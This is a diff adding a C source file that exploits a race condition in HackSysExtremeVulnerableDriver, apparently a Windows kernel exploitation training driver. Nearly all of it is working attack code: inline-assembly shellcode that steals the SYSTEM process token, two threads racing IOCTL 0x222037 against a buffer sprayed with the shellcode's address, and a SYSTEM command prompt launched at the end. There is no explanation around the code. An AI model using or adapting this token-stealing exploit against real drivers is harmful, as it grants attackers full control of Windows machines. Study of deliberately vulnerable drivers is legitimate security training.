@@ -1,0 +1,83 @@
+#include <windows.h>
+#include <stdio.h>
+DWORD buf[0xf00];
+HANDLE hDriver;
+DWORD dwBytesOut = 0;
+int temp = 0;
+static VOID ShellCode()
+{
+	
+	__asm
+	{
+		//int 3;
+		pop  edi
+		pop  esi
+		pop  ebx
+		pushad
+		mov eax, fs: [124h]		// Find the _KTHREAD structure for the current thread
+		mov eax, [eax + 0x50]   // Find the _EPROCESS structure
+		mov ecx, eax
+		mov edx, 4				// edx = system PID(4)
+
+		// The loop is to get the _EPROCESS of the system
+		find_sys_pid :
+		mov eax, [eax + 0xb8]	// Find the process activity list
+		sub eax, 0xb8    		// List traversal
+		cmp[eax + 0xb4], edx    // Determine whether it is SYSTEM based on PID
+		jnz find_sys_pid
+
+		// Replace the Token
+		mov edx, [eax + 0xf8]
+		mov[ecx + 0xf8], edx
+		popad
+		mov ecx, eax
+		mov eax,ecx //loc_4453A4
+		pop ebp
+		ret 8
+	}
+	
+}
+VOID  WINAPI ThreadFunc1() {
+	for (size_t i = 0; i < 66666; i++)
+	{
+
+		DWORD size = 0x123;
+		buf[1] = size;
+		DeviceIoControl(hDriver, 0x222037, buf, 0, 0, 0, &dwBytesOut, NULL);
+	}
+}
+VOID  WINAPI ThreadFunc() {
+	for (size_t i = 0; i < 66666; i++)
+	{
+
+		DWORD size = 0x824;
+		buf[1] = size;
+		DeviceIoControl(hDriver, 0x222037, buf, 0, 0, 0, &dwBytesOut, NULL);
+	}
+}
+int main() {
+	hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+	if (hDriver == INVALID_HANDLE_VALUE) {
+		printf("[!] Unable to get a handle on the device\n");
+		return(-1);
+	}
+	printf("%d\n", GetCurrentProcessorNumber());
+	for (size_t i = 0; i < 0xf00; i++)
+	{
+		buf[i] = (DWORD)&ShellCode;
+	}
+	buf[0] = (DWORD)&buf;
+	DWORD threadId;
+	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadFunc, 0, 0, &threadId);
+	DWORD threadId1;
+	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadFunc1, 0, 0, &threadId1);
+
+	Sleep(1000);
+	STARTUPINFO si = { sizeof(STARTUPINFO) };
+	PROCESS_INFORMATION pi;
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+	CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+	return 0;
+}
